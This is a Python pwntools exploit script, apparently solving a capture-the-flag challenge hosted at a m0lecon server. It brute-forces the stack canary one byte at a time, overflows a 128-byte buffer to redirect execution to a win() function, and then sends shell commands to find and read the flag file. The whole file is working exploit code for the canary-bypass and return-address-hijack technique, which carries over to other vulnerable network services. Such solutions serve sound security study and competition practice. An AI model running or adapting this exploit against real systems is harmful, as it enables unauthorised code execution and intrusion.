from pwn import *

# From checksec:
# Stack:      Canary found  =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        No PIE (0x400000)  =>  addresses are static and can be used directly in the exploit (e.g., win() function address)

HOST, PORT = "offsec.m0lecon.it", 13541
OFFSET_TO_CANARY = 128 + 8   # 128 bytes for the buffer + 8 bytes for alignment
OFFSET_TO_RIP = OFFSET_TO_CANARY + 8 + 8    # 8 bytes for the canary and 8 bytes for the saved RBP
ret_gadget = 0x40101a
win_addr = 0x401630

known = b"\x00"  # the canary always starts with a null byte (LSB)

for i in range(7):
    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        conn = remote(HOST, PORT, level='error')

        conn.recvuntil(b"> ")
        conn.sendline(b"1")

        conn.recvuntil(b"Enter your signal log entry: \n")  # beware to include "\n" because of puts()
        conn.send(payload)

        try:
            data = conn.recv(timeout=0.2)
        except EOFError:
            data = b""
        conn.close()

        if b"Log entry recorded." in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break

canary = u64(known)
log.info(f"Canary: {canary:#x}")

conn = remote(HOST, PORT, level='error')
conn.recvuntil(b"> ")
conn.sendline(b"1")
conn.recvuntil(b"Enter your signal log entry: \n")  # beware to include "\n" because of puts()

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # 8 bytes for the saved RBP
    p64(ret_gadget),    # ret gadget for alignment
    p64(win_addr),
)

conn.send(payload)

conn.sendline(b"find / -name flag")    # find the path of the flag file (to be used in the next command)
conn.sendline(b"cat /home/user/flag")  # insert here the path of the flag file

conn.interactive()
